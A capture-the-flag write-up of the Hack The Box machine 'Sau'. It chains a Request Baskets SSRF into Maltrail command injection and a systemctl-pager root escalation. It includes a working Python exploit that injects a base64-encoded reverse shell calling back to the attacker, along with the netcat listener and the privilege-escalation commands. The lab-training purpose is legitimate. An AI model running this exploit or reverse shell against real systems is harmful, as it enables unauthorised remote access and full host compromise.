---
title: "Hack The Box: Sau Write-Up"
date: 2024-01-21 14:00
categories: [Write-ups]
tags: [htb, lab, nmap, ssrf, command injection]
img_path: /htb/machines/sau/
---

Sau was my first active easy-rated machine that I was able to pwn on HackTheBox. It was quite challenging because it combined several vulnerabilities that need to be exploited to get the flags. For one of those vulnerabilities, I also had to stop for a while in order to get more familiar with it before I could properly exploit it. But on the other hand, it was very rewarding when I finally got the root flag. So let's go through the whole process together.

## Enumeration

Let's start with an nmap scan as always.

```console
$ nmap -sV -sC -Pn 10.10.11.224
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
55555/tcp open     unknown
```

We can see that nmap could find the ports 22, 80, 55555 with the services ssh, http, and unknown, respectively. However, the messages to port 80 seem to have been filtered by a firewall. So maybe this is a web server listening on localhost only? Let's remember that for later.

To get more information about the other ports, let's do a more in-depth scan for those.

```console
nmap -sV -sC -p 22,55555 10.10.11.224
```

![Nmap Scan](nmap-scan.png)

In the output, you will also see the fingerprint of the service running on port 55555 because this service is unknown to nmap. However, as it seems to respond to HTTP requests, we can assume that it is some kind of web service. Let's take a look at it in the browser.

![Request Baskets](request-baskets.png)

It is a service called [Request Baskets](https://github.com/darklynx/request-baskets). After some quick research, it is a service that collects HTTP requests that go through so-called baskets for later inspection via an API or the UI. 

In the footer of the homepage, you can also see that version 1.2.1 is in use. Let's search on the Internet if there are some known vulnerabilities for this version. Indeed, we quickly find [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163) mentioned which explains that the API endpoint /api/baskets/{name} is vulnerable to a Server-Side Request Forgery (SSRF) attack.

There is also an [example exploit](https://packetstormsecurity.com/files/174128/Request-Baskets-1.2.1-Server-Side-Request-Forgery.html) available. We can take a look at it to get a better understanding of how the exploit works. It makes a POST request to the endpoint /api/baskets/{name}. In the payload, the "forward_url" attribute is set to an attacker server. This server can either be a server controlled by us or an internal server of the target network that we cannot access from outside.

Remember our assumption that an internal web server may be running on port 80 that only listens on localhost? Taking that into account, the latter option seems promising to get access to that web server.

## SSRF Exploitation in Request Baskets

There are mainly two ways how we can exploit the SSRF vulnerability. We can either use the API directly like in the example exploit or configure a basket via the UI. We'll take the UI route because I personally think it's a bit easier. 

First, we create a basket with an arbitrary name and open it.

![Empty Basket](empty-basket.png)

Afterwards, we can configure the basket settings by clicking on the cogwheel on the top right.

Let's set the Forward URL field to *http://localhost:80* and check all the checkboxes. We can keep the default value for Basket Capacity.

![Basket Settings](basket-settings-1.png)

Once that's done, we can make a curl request to the basket. It should now forward the request to the internal web server on port 80 and return the HTML code for its homepage.

```console
curl http://10.10.11.224:55555/{bucket_name} > request_hidden_page.html
```

When we inspect the HTML code's title tag, we can see that the internal web server runs a service called Maltrail. At the bottom, we can also find the version in use: 0.53.

> You can also find a small Easter Egg in the HTML code. Hint: collaboration.
{: .prompt-info}

## Mailtrail

We can now repeat the process from before and search for known vulnerabilities for this service's version. Luckily, we can find an [Unauthenticated OS Command Injection](https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/). It seems that the login page allows OS command injection in the username parameter. This looks like a vulnerability we can use to get a reverse shell.

In order to do that, we first need to change the Forward URL setting of our basket to *http://localhost:80/login*. 

![Basket Settings](basket-settings-2.png)

After that, we can use an already existing exploit written in Python, adjusting it slightly. The source code can be found [here](https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py). For our purposes, we will only remove the concatenation of the "/login" string in line 28. The result looks like this:

```python
import sys;
import os;
import base64;

def main():
	listening_IP = None
	listening_PORT = None
	target_URL = None

	if len(sys.argv) != 4:
		print("Error. Needs listening IP, PORT and target URL.")
		return(-1)
	
	listening_IP = sys.argv[1]
	listening_PORT = sys.argv[2]
	target_URL = sys.argv[3]
	print("Running exploit on " + str(target_URL))
	curl_cmd(listening_IP, listening_PORT, target_URL)

def curl_cmd(my_ip, my_port, target_url):
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(command)

if __name__ == "__main__":
  main()
```

Before we start this script, however, we will need to start a netcat listener in a different terminal window.

```console
nc -lnvp 4444
```

Now we are ready to execute the exploitation script.

```console
python3 exploit.py {your_tun0_ip} 4444 http://10.10.11.224:55555/{basket_name}
```

On our netcat listener, we should get a reverse shell back as the user puma.

![Reverse Shell](reverse-shell.png)

The user flag can be found under /home/puma/user.txt.

## Privilege Escalation

In order to get the root flag, we need to find a way to escalate our privileges. First, let's see what privileges our current user has.

```console
sudo -l
```

![Sudo Privileges](sudo-privileges.png)

Apparently, we can execute the systemctl status subprogram for the trail service. Let's look on the Internet if we can exploit this somehow. After a bit of searching, we can find [CVE-2023-26604](https://nvd.nist.gov/vuln/detail/CVE-2023-26604). This CVE explains that versions of systemd before 247 are vulnerable to local privilege escalation. Let's see if this applies to our current situation.

```console
systemctl --version
```

The systemd version of our target host seems to be 245. So it should be vulnerable. Let's try it.

```console
sudo /usr/bin/systemctl status trail.service
```

After it has opened, type "!/bin/sh" to get a root shell.

The system flag can be found under /root/root.txt.